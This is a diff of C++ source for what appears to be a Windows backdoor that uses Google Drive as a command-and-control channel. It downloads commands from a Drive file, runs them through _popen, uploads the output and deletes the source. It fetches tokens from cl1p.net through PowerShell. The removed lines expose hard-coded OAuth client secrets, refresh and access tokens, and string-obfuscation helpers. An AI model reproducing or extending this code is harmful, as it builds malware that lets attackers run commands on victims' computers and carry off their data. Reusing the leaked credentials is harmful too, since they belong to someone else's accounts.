@@ -4,118 +4,15 @@
 #define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
 #endif
 
-
 #include <windows.h>
 #include <string>
-#include <stdio.h>
+#include <cstdio>
 #include <algorithm>
 #include <stack>
 #include <spdlog/spdlog.h>
-
-//std::string deltaDecodeA(const std::vector<int>& encoded) {
-//	if (encoded.empty()) {
-//		return "";
-//	}
-//
-//	std::string decoded;
-//
-//	decoded.push_back(static_cast<char>(encoded[0]));
-//
-//	for (size_t i = 1; i < encoded.size(); ++i) {
-//		char newChar = static_cast<char>(static_cast<int>(decoded[i - 1]) + encoded[i]);
-//		decoded.push_back(newChar);
-//	}
-//
-//	return decoded;
-//}
-////string obfusecation
-//
-//std::wstring deltaDecodeW(const std::vector<int>& encoded) {
-//	if (encoded.empty()) {
-//		return L""; // Return an empty wide string
-//	}
-//
-//	std::wstring decoded;
-//
-//	decoded.push_back(static_cast<wchar_t>(encoded[0]));
-//
-//	for (size_t i = 1; i < encoded.size(); ++i) {
-//		wchar_t newChar = static_cast<wchar_t>(static_cast<int>(decoded[i - 1]) + encoded[i]);
-//		decoded.push_back(newChar);
-//	}
-//
-//	return decoded;
-//}
-////string obfusecation
-
-#define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
-#define FAILSAFE_THRESHOLD 2402 * 1000
-#define RESULTS_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
-#define SOURCE_ID "1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
-#define MAX_UPLOAD_SIZE 4608 // 4.5 * 1024
-
-#define BDRIVE_OK 200
-#define BDRIVE_NO_CONTENT 204
-#define BDRIVE_REFRESH_NOT_ACCEPTABLE 406
-#define BDRIVE_TIMED_OUT 600
-#define BDRIVE_NO_INTERNET 601
-#define BDRIVE_INVALID_ACCESS_TOKEN 401
-#define BDRIVE_INVALID_REFRESH_TOKEN 699
-
-#define STATE_INIT 0b11111111
-#define STATE_DOWNLOADING 0b00
-#define STATE_EXECUTING 0b01
-#define STATE_UPLOADING 0b10
-#define STATE_DELETING 0b11
-#define STATE_ACCESS_TOKEN_LOST 0b100
-#define STATE_REFRESH_TOKEN_LOST 0b101
-#define STATE_CONNECTION_LOST 0b1000
-
-#define CLIPBOARD "41594159"
-#define CLIENT_SECRET "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"
-#define CLIENT_ID "1013834111625-kc1mpb1btv5e7nci2lak6f4v8nklon3p.apps.googleusercontent.com"
-#define RESULT_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
-#define BACKUP_FILE_ID "1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1"
-
-#define INIT_REFRESH_TOKEN "1//03263N6jS7d6TCgYIARAAGAMSNwF-L9Irn4u11nS_Q6Btl1S88WilfGjVcnakac_1YDB3chyZw8caf2ppdejE5nOI5ixhAaIlKaw"
-#define INIT_ACCESS_TOKEN "ya29.a0AW4XtxhDsQVZR1dSsbv9t7pKQWALBg5B0JFZM8EE4bXUQywxoceYQV28yBrMJ55vH4sZWb6x0v1Y58p0JWj-Z9AFHLcLZp4MzqFizex6CE00qkl9XIC7ff8rYPw8stNkciy_K3sXe-lvt1Nxg8uhdz61jes1-voXKhLSQ80ZaCgYKAfwSARASFQHGX2MioUkPjE-OFemftCbVt19THQ0175"
-#define SLEEP_TIME_THRESHOLD 3125 // 5 ^ 5
-
-
-static const char bs64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-"abcdefghijklmnopqrstuvwxyz"
-"0123456789+/";
-
-static DWORD expo(DWORD base, DWORD exponent) {
-	if (exponent == 0) {
-		return 1;
-	}
-	else if (exponent == 1) {
-		return base;
-	}
-	DWORD half = expo(base, exponent / 2);
-	return half * half * expo(base, exponent % 2);
-}
-
-static std::string base64_encode(const std::string& input) {
-	std::string encoded;
-	int val = 0, valb = -6;
-	for (unsigned char c : input) {
-		val = (val << 8) + c;
-		valb += 8;
-		while (valb >= 0) {
-			encoded.push_back(bs64[(val >> valb) & 0x3F]);
-			valb -= 6;
-		}
-	}
-	if (valb > -6) {
-		encoded.push_back(bs64[((val << 8) >> (valb + 8)) & 0x3F]);
-	}
-	while (encoded.size() % 4) {
-		encoded.push_back('='); // Add padding if necessary
-	}
-	return encoded;
-}
+#include "cloudfunctions.h"
+#include "aes.h"
+#include "utils.h"
 
 inline WORD getErrorCode(std::string input) {
 	return (input[0] - '0') * 100 + (input[1] - '0') * 10 + (input[2] - '0');
@@ -136,7 +33,7 @@ inline WORD getErrorCode(char* input) {
 /// BDRIVE_TIMED_OUT
 /// BDRIVE_NO_INTERNET
 /// </returns>
-static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {
+WORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {
 	constexpr int BUFFER_SIZE = 1024;
 
 	WORD errorCode = BDRIVE_OK;
@@ -172,7 +69,7 @@ static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken
 /// BDRIVE_INVALID_REFRESH_TOKEN
 /// BDRIVE_TIMED_OUT Invoke-Restmethod Timedout!
 /// </returns>
-static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken) {
+WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken) {
 	constexpr int BUFFER_SIZE = 1024;
 	char* buffer = new char[BUFFER_SIZE];
 	std::string output;
@@ -180,7 +77,6 @@ static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& 
 	sprintf_s(buffer, BUFFER_SIZE - 1, "powershell -c \"try{(Invoke-WebRequest https://cl1p.net/%s).Content} catch{Write-Host -NoNewline 600}\"", CLIPBOARD);
 
 	FILE* file = _popen(buffer, "r");
-	////// you should edit this
 	while (fgets(buffer, sizeof(buffer), file) != nullptr) {
 		output += buffer;
 	}
@@ -213,7 +109,7 @@ static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& 
 	}
 }
 
-static WORD checkConnection() {
+WORD checkConnection() {
 	constexpr int BUFFER_SIZE = 512;
 
 	WORD errorCode = BDRIVE_NO_INTERNET;
@@ -233,7 +129,6 @@ static WORD checkConnection() {
 
 	return errorCode;
 }
-//review this two function
 
 /// <summary>
 /// This function downloads the Source.txt file in the Drive
@@ -246,7 +141,7 @@ static WORD checkConnection() {
 /// 600 Timeout!
 /// 601 Unhandled Exception!
 /// </returns>
-static WORD downloadSourceContext(std::string accessToken, std::string& output) {
+WORD downloadSourceContext(std::string accessToken, std::string& output) {
 	constexpr int BUFFER_SIZE = 1024;
 
 	if (accessToken.empty())
@@ -285,8 +180,8 @@ static WORD downloadSourceContext(std::string accessToken, std::string& output) 
 /// </summary>
 /// <param name="input">The command downloaded from source. (The input is limited to 1024 character)</param>
 /// <param name="output">Output of the pipe that got opened by _popen()</param>
-/// <returns>returns 0 :|</returns>
-static WORD commandExecuter(std::string input, std::string& output) {
+/// <returns>Returns 0 on success, error code on failure</returns>
+WORD commandExecuter(std::string input, std::string& output) {
 	constexpr int BUFFER_SIZE = 1024;
 
 	std::replace(input.begin(), input.end(), '\n', '&');
@@ -308,8 +203,8 @@ static WORD commandExecuter(std::string input, std::string& output) {
 /// </summary>
 /// <param name="uploadpart"></param>
 /// <param name="accessToken"></param>
-/// <param name="index"></param>
-/// <param name="subIndex"></param>
+/// <param name="index">Index of the file being uploaded</param>
+/// <param name="subIndex">Sub-index for multi-part uploads</param>
 /// <returns>
 /// 200 OK!
 /// 401 Unauthorized!
@@ -344,7 +239,7 @@ static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DW
 /// <param name="accessToken"></param>
 /// <param name="index">The index of whole files that you want to upload</param>
 /// <returns>Same as singlePartUpload function</returns>
-static WORD uploadResult(std::string input, std::string accessToken, DWORD index, DWORD& subIndex) {
+WORD uploadResult(std::string input, std::string accessToken, DWORD index, DWORD& subIndex) {
 	//input = base64_encode(input);
 
 	WORD errorCode = BDRIVE_OK;
@@ -373,7 +268,7 @@ static WORD uploadResult(std::string input, std::string accessToken, DWORD index
 /// 600 Timeout!
 /// 601 Unhandled Exception!
 /// </returns>
-static WORD deleteSource(std::string accessToken) {
+WORD deleteSource(std::string accessToken) {
 	constexpr int BUFFER_SIZE = 1024;
 
 	char* buffer = new char[BUFFER_SIZE];
